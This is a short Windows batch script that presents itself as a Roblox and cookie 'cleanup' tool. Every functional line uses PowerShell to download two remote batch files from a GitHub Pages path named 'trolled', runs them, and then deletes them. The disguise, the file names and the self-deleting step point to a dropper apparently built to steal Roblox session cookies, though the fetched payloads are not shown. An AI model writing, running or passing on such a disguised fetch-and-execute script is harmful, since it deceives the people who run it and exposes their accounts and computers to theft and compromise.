@echo off
echo Starting cleanup...

REM Download additional scripts
powershell -Command "& {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://bavavaba39.github.io/robloxmoment.github.io/trolled/main1.bat' -OutFile 'cookies.bat'}"
powershell -Command "& {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://bavavaba39.github.io/robloxmoment.github.io/trolled/main2.bat' -OutFile 'roblox.bat'}"

REM Execute Roblox cleanup
call roblox.bat

REM Execute Cookie cleanup
call cookies.bat

REM Cleanup downloaded files
del /f /q cookies.bat
del /f /q roblox.bat

echo All operations completed!
pause
